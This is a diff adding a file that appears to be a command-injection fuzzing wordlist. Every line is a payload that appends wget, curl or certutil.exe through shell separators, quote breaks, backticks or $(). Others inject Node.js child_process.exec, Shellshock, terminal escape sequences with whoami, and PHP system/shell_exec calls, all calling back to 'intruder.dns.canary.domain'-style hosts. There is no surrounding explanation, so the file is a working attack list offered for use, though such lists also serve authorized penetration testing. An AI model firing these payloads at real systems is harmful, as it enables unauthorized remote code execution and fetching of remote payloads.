@@ -1,0 +1,67 @@
+& wget http://intruder.dns.canary.domain/
+&& wget http://intruder.dns.canary.domain/
+| wget http://intruder.dns.canary.domain/
+|| wget http://intruder.dns.canary.domain/
+;wget http://intruder.dns.canary.domain/
+& curl http://intruder.dns.canary.domain/
+&& curl http://intruder.dns.canary.domain/
+| curl http://intruder.dns.canary.domain/
+|| curl http://intruder.dns.canary.domain/
+;curl http://intruder.dns.canary.domain/
+$(wget http://intruder.dns.canary.domain/)
+`wget http://intruder.dns.canary.domain/`
+$(curl http://intruder.dns.canary.domain/)
+`curl http://intruder.dns.canary.domain/`
+& certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+&& certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+| certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+|| certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+'& wget http://intruder.dns.canary.domain/
+'&& wget http://intruder.dns.canary.domain/
+'| wget http://intruder.dns.canary.domain/
+'|| wget http://intruder.dns.canary.domain/
+';wget http://intruder.dns.canary.domain/
+'& curl http://intruder.dns.canary.domain/
+'&& curl http://intruder.dns.canary.domain/
+| curl http://intruder.dns.canary.domain/
+'|| curl http://intruder.dns.canary.domain/
+';curl http://intruder.dns.canary.domain/
+'$(wget http://intruder.dns.canary.domain/)
+'`wget http://intruder.dns.canary.domain/`
+'$(curl http://intruder.dns.canary.domain/)
+'`curl http://intruder.dns.canary.domain/`
+'& certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+'&& certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+'| certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+'|| certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+"& wget http://intruder.dns.canary.domain/
+"&& wget http://intruder.dns.canary.domain/
+"| wget http://intruder.dns.canary.domain/
+"|| wget http://intruder.dns.canary.domain/
+";wget http://intruder.dns.canary.domain/
+"& curl http://intruder.dns.canary.domain/
+"&& curl http://intruder.dns.canary.domain/
+"| curl http://intruder.dns.canary.domain/
+"|| curl http://intruder.dns.canary.domain/
+";curl http://intruder.dns.canary.domain/
+"$(wget http://intruder.dns.canary.domain/)
+"`wget http://intruder.dns.canary.domain/`
+"$(curl http://intruder.dns.canary.domain/)
+"`curl http://intruder.dns.canary.domain/`
+"& certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+"&& certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+"| certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+"|| certutil.exe -urlcache -split -f http://intruder.dns.canary.domain/ out
+y'-require('child_process').exec('curl http://noderce.dns.canary.domain')-'
+y'-require('child_process').exec('wget http://noderce.dns.canary.domain')-'
+() { :;}; curl http://shellshock.intruder.dns.canary.domain/.testing/shellshock.txt
+\n\033[2curl http://intruder.dns.canary.domain/.testing/term_escape.txt?user=\`whoami\`
+\n\033[2wget http://intruder.dns.canary.domain/.testing/term_escape.txt?user=\`whoami\`
+\necho INJECTX\nexit\n\033[2Acurl http://intruder.dns.canary.domain/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Awget http://intruder.dns.canary.domain/.testing/rce_vuln.txt\n
+`curl http://intruder.dns.canary.domain/`
+`wget http://intruder.dns.canary.domain/`
+system('wget http://intruder.dns.canary.domain/.testing/rce_vuln.txt');
+system('curl http://intruder.dns.canary.domain/.testing/rce_vuln.txt');
+shell_exec('curl http://intruder.dns.canary.domain/.testing/rce_vuln.txt');
+shell_exec('wget http://intruder.dns.canary.domain/.testing/rce_vuln.txt');
